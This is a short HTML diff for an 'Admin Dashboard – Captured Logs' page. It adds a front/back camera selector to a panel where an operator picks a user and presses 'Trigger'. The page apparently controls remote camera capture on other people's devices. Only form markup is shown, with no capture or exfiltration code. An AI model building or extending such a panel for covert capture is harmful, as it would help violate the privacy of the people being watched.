@@ -17,19 +17,25 @@
 <body>
   <h1>📋 Admin Dashboard – Captured Logs</h1>
 
-  <!-- Trigger Section -->
-  <div class="trigger-panel">
-    <label for="manual-username">📝 Enter Username:</label>
-    <input type="text" id="manual-username" placeholder="Type username..." style="margin-right: 10px;" />
+ <div class="trigger-panel">
+  <label for="manual-username">📝 Enter Username:</label>
+  <input type="text" id="manual-username" placeholder="Type username..." style="margin-right: 10px;" />
 
-    <label for="user-select">🎯 Or Select User:</label>
-    <select id="user-select" style="margin-right: 10px;">
-      <option value="">-- Select a user --</option>
-      <option value="__anonymous__">Anonymous User</option>
-    </select>
+  <label for="user-select">🎯 Or Select User:</label>
+  <select id="user-select" style="margin-right: 10px;">
+    <option value="">-- Select a user --</option>
+    <option value="__anonymous__">Anonymous User</option>
+  </select>
 
-    <button onclick="triggerSelectedUser()">⚡ Trigger</button>
-  </div>
+  <!-- 👇 Add camera choice -->
+  <label for="camera-select">📷 Camera:</label>
+  <select id="camera-select" style="margin-right: 10px;">
+    <option value="front">Front</option>
+    <option value="back">Back</option>
+  </select>
+
+  <button onclick="triggerSelectedUser()">⚡ Trigger</button>
+</div>
 
   <!-- Filter Panel -->
   <div class="filter-panel">
